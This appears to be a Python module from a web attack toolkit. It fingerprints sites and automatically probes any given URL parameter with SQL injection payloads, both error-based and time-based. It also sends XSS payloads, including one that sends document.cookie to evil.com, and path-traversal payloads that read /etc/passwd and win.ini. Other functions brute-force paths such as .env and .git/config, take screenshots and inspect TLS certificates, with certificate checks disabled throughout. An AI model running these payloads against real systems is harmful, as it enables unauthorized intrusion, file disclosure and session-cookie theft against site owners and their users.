import logging
import re
import socket
import ssl as ssl_mod
import urllib.request
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

log = logging.getLogger("artenisa.web")

TECH_PATTERNS = {
    "wordpress": [r"wp-content", r"wp-includes", r"wp-json", r"WordPress"],
    "jquery": [r"jquery", r"jQuery"],
    "react": [r"react", r"react-dom", r"__REACT_DEVTOOLS"],
    "laravel": [r"Laravel", r"csrf-token", r"__livewire"],
    "django": [r"django", r"csrfmiddlewaretoken", r"__admin"],
    "bootstrap": [r"bootstrap", r"bootstrap\.min\.css"],
    "nginx": [r"nginx"],
    "apache": [r"Apache"],
    "iis": [r"IIS", r"Microsoft-IIS"],
    "cloudflare": [r"cloudflare", r"__cfduid"],
}

SQL_ERRORS = [
    r"SQL syntax", r"mysql_fetch", r"MySQLSyntaxError",
    r"ORA-\d{5}", r"Oracle.*driver",
    r"Microsoft OLE DB", r"Microsoft.*ODBC",
    r"PostgreSQL.*ERROR", r"psql.*ERROR",
    r"SQLite.*Error", r"unrecognized token",
    r"Warning.*sql", r"Division by zero",
    r"mssql", r"driver.*SQL Server",
    r"Syntax error in string",
]

SQLI_PAYLOADS_ERROR = [
    "'", "\"", "')", "\"))", "';", "--", "#'",
    "' OR '1'='1", "' OR '1'='1' --",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --",
    "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1' UNION SELECT 1--", "1' UNION SELECT 1,2--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
]

SQLI_PAYLOADS_TIME = [
    "' OR IF(1=1,SLEEP(2),0)--",
    "\" OR IF(1=1,SLEEP(2),0)--",
    "1' OR SLEEP(2)--",
    "1'; WAITFOR DELAY '0:0:2'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "\" onmouseover=alert(1)",
    "'-alert(1)-'",
    "<script>fetch('https://evil.com/'+document.cookie)</script>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../windows/win.ini",
    "....//....//....//windows/win.ini",
    "../../../../etc/passwd%00",
    "..%252f..%252f..%252fetc/passwd",
    "../../../../etc/hosts",
]

LFI_PATTERNS = [
    r"root:.*:0:0:", r"\[fonts\]", r"127\.0\.0\.1\s+localhost",
    r"BITMAP", r"Microsoft Windows",
]

COMMON_DIRS = [
    "admin", "login", "wp-admin", "wp-login.php", "administrator",
    "api", "v1", "v2", "api/v1", "api/v2",
    "backup", "backups", "db", "database", "sql",
    "config", "config.php", "configuration",
    ".env", ".git/config", ".gitignore",
    "robots.txt", "sitemap.xml", "sitemap",
    "phpinfo.php", "info.php", "test.php",
    "uploads", "files", "assets", "static",
    "cgi-bin", "cgi-bin/status",
]

def _http_get(url: str, timeout: float = 8.0) -> tuple:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    try:
        ctx = ssl_mod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_mod.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        headers = dict(resp.headers)
        status = resp.status
        resp.close()
        return status, headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)

def detect_tech(url: str) -> dict:
    status, headers, body = _http_get(url)
    detected = {"server": headers.get("Server", ""), "x-powered-by": headers.get("X-Powered-By", "")}
    frameworks = []
    for tech, patterns in TECH_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, body, re.IGNORECASE) or re.search(pat, str(headers), re.IGNORECASE):
                frameworks.append(tech)
                break
    detected["frameworks"] = sorted(set(frameworks))
    detected["status"] = status
    detected["url"] = url
    detected["headers"] = {k: v for k, v in sorted(headers.items()) if k.lower() in {"server", "x-powered-by", "x-aspnet-version", "x-generator", "set-cookie", "content-type"}}
    return detected

def check_sqli(url: str, param: str) -> dict:
    results = {"url": url, "param": param, "error_based": False, "time_based": False, "vulnerable": False, "details": []}
    for payload in SQLI_PAYLOADS_ERROR:
        try:
            parsed = list(urllib.parse.urlparse(url))
            qs = urllib.parse.parse_qs(parsed[4], keep_blank_values=True)
            qs[param] = [payload]
            parsed[4] = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed)
            status, headers, body = _http_get(test_url)
            for err_pat in SQL_ERRORS:
                if re.search(err_pat, body, re.IGNORECASE):
                    results["error_based"] = True
                    results["vulnerable"] = True
                    results["details"].append({"tipo": "error_based", "payload": payload, "error": err_pat})
                    break
        except Exception:
            continue
    for payload in SQLI_PAYLOADS_TIME:
        try:
            parsed = list(urllib.parse.urlparse(url))
            qs = urllib.parse.parse_qs(parsed[4], keep_blank_values=True)
            qs[param] = [payload]
            parsed[4] = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed)
            t0 = __import__("time").time()
            _http_get(test_url, timeout=6.0)
            elapsed = __import__("time").time() - t0
            if elapsed > 2.0:
                results["time_based"] = True
                results["vulnerable"] = True
                results["details"].append({"tipo": "time_based", "payload": payload, "elapsed": round(elapsed, 2)})
                break
        except Exception:
            continue
    return results

def check_xss(url: str, param: str) -> dict:
    results = {"url": url, "param": param, "vulnerable": False, "details": []}
    for payload in XSS_PAYLOADS:
        try:
            parsed = list(urllib.parse.urlparse(url))
            qs = urllib.parse.parse_qs(parsed[4], keep_blank_values=True)
            qs[param] = [payload]
            parsed[4] = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed)
            status, headers, body = _http_get(test_url)
            if payload in body:
                results["vulnerable"] = True
                results["details"].append({"payload": payload[:60], "reflected": True})
                break
        except Exception:
            continue
    return results

def check_lfi(url: str, param: str) -> dict:
    results = {"url": url, "param": param, "vulnerable": False, "details": []}
    for payload in LFI_PAYLOADS:
        try:
            parsed = list(urllib.parse.urlparse(url))
            qs = urllib.parse.parse_qs(parsed[4], keep_blank_values=True)
            qs[param] = [payload]
            parsed[4] = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed)
            status, headers, body = _http_get(test_url)
            for pat in LFI_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    results["vulnerable"] = True
                    results["details"].append({"payload": payload, "matched": pat, "preview": body[:200]})
                    return results
        except Exception:
            continue
    return results

def dir_bruteforce(url: str, wordlist: list = None) -> dict:
    if wordlist is None:
        wordlist = COMMON_DIRS
    base = url.rstrip("/")
    found = []
    def _check_dir(path: str) -> dict | None:
        full = f"{base}/{path}"
        try:
            req = urllib.request.Request(full, method="HEAD", headers={"User-Agent": "Mozilla/5.0"})
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                return {"path": f"/{path}", "status": resp.status, "size": resp.headers.get("Content-Length", "")}
        except urllib.error.HTTPError as e:
            if e.code in (200, 301, 302, 403, 401, 500):
                return {"path": f"/{path}", "status": e.code, "size": str(e.headers.get("Content-Length", ""))}
            return None
        except Exception:
            return None
    with ThreadPoolExecutor(max_workers=15) as executor:
        futuros = {executor.submit(_check_dir, d): d for d in wordlist}
        for fut in as_completed(futuros):
            r = fut.result()
            if r:
                found.append(r)
    found.sort(key=lambda x: x["path"])
    return {"target": url, "total_tried": len(wordlist), "found": found}

def screenshot(url: str) -> dict:
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return {"url": url, "success": False, "error": "Playwright no instalado"}
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
            )
            page = browser.new_page(viewport={"width": 1280, "height": 720})
            page.goto(url, wait_until="networkidle", timeout=30000)
            title = page.title()
            png_bytes = page.screenshot(full_page=True, type="png")
            import base64
            b64 = base64.b64encode(png_bytes).decode("utf-8")
            browser.close()
            return {
                "url": url,
                "success": True,
                "title": title,
                "screenshot_base64": b64,
            }
    except Exception as e:
        return {"url": url, "success": False, "error": str(e)}


def ssl_check(host: str, port: int = 443) -> dict:
    result = {"host": host, "port": port, "valid": False, "error": ""}
    try:
        ctx = ssl_mod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_mod.CERT_NONE
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                result["valid"] = True
                result["version"] = ssock.version()
                result["cipher"] = {"name": cipher[0], "protocol": cipher[1], "bits": cipher[2]} if cipher else {}
                if cert:
                    subject = dict(x[0] for x in cert.get("subject", []))
                    issuer = dict(x[0] for x in cert.get("issuer", []))
                    result["subject"] = subject.get("commonName", "")
                    result["organization"] = subject.get("organizationName", "")
                    result["issuer"] = issuer.get("commonName", "")
                    result["valid_from"] = cert.get("notBefore", "")
                    result["valid_to"] = cert.get("notAfter", "")
                    result["san"] = cert.get("subjectAltName", [])
    except socket.timeout:
        result["error"] = "Conexion timeout"
    except ConnectionRefusedError:
        result["error"] = "Conexion rechazada"
    except Exception as e:
        result["error"] = str(e)
    return result
